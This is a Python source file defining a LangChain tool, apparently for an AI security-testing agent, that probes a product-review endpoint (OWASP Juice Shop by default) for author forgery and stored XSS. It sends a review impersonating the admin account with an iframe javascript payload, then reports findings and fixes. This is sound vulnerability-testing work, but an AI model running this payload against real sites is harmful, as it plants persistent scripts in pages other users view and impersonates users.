from langchain.tools import tool
import json
import requests
from ._helpers import login_juice_shop, _finding, BASE_TIMEOUT


@tool
def test_forged_review_xss(
    base_url: str,
    endpoint: str,
    product_id: str = "1",
    author_field: str = "author",
    message_field: str = "message",
    forged_author: str = "admin@juice-sh.op",
    xss_payload: str = "<iframe src=\"javascript:alert('xss')\">",
    auth_email: str = "",
    auth_password: str = "",
):
    """
    проверяет две вещи на эндпоинте отзывов:
      1) подделку автора — сервер берёт author из тела, а не из сессии;
      2) stored XSS — payload сохраняется и возвращается без экранирования.

    работает на любом приложении с эндпоинтом отзывов.

    base_url - адрес приложения (http://juice-shop:3000)
    endpoint - шаблон эндпоинта с {id}, например "/rest/products/{id}/reviews"
    product_id - ID товара/объекта для отзыва
    author_field - имя поля автора в теле (по умолчанию "author")
    message_field - имя поля сообщения (по умолчанию "message")
    forged_author - кем представиться (по умолчанию admin@juice-sh.op)
    xss_payload - XSS-payload (по умолчанию <iframe src="javascript:...">)
    auth_email - email для логина (если пусто — логин Juice Shop)
    auth_password - пароль для логина
    """
    # ========== логин ==========
    if auth_email:
        token, login_data = login_juice_shop(base_url, email=auth_email, password=auth_password)
    else:
        token, login_data = login_juice_shop(base_url)
    if not token:
        return json.dumps({"error": login_data}, ensure_ascii=False)

    # ========== формирование URL и payload ==========
    path = endpoint.replace("{id}", str(product_id))
    url = f"{base_url.rstrip('/')}{path}"
    payload = {
        author_field: forged_author,
        message_field: xss_payload,
    }

    # ========== отправка ==========
    try:
        r = requests.put(
            url,
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
            json=payload,
            timeout=BASE_TIMEOUT,
        )
        body = r.text[:500]
    except Exception as exc:
        return json.dumps({"error": str(exc)})

    # ========== проверка подделки автора ==========
    if r.status_code not in (200, 201):
        f = _finding(
            title="Forged review (не подтверждено)",
            severity="info",
            endpoint=url,
            evidence=f"status={r.status_code}, body={body[:300]}",
            status="requires_verification",
            tool="test_forged_review_xss",
        )
        return json.dumps({"findings": [f]}, ensure_ascii=False, indent=2)

    # создан — проверяем, что автор действительно подделан
    forged_ok = forged_author.lower() in body.lower()

    # ========== проверка stored XSS (чтение обратно) ==========
    xss_ok = False
    try:
        read_url = url  # GET того же эндпоинта
        rd = requests.get(read_url, timeout=BASE_TIMEOUT)
        read_body = rd.text[:3000]
        xss_ok = xss_payload in read_body
    except Exception:
        read_body = ""

    # ========== вердикт ==========
    findings = []
    if forged_ok:
        findings.append(_finding(
            title="Подделка автора отзыва",
            severity="high",
            endpoint=url,
            evidence=body,
            description="Сервер доверяет полю author из тела, позволяя выдать отзыв за другого пользователя.",
            recommendation="Брать автора из сессии, а не из тела запроса.",
            tool="test_forged_review_xss",
        ))
    if xss_ok:
        findings.append(_finding(
            title="Stored XSS в отзывах",
            severity="high",
            endpoint=url,
            evidence=read_body[:500],
            description="Payload сохраняется и возвращается без экранирования.",
            recommendation="Экранировать HTML при выводе, использовать CSP.",
            tool="test_forged_review_xss",
        ))

    if not findings:
        findings.append(_finding(
            title="Forged review / XSS (не подтверждено)",
            severity="info",
            endpoint=url,
            evidence=f"status={r.status_code}, forged_ok={forged_ok}, xss_ok={xss_ok}",
            status="requires_verification",
            tool="test_forged_review_xss",
        ))

    return json.dumps({"findings": findings}, ensure_ascii=False, indent=2)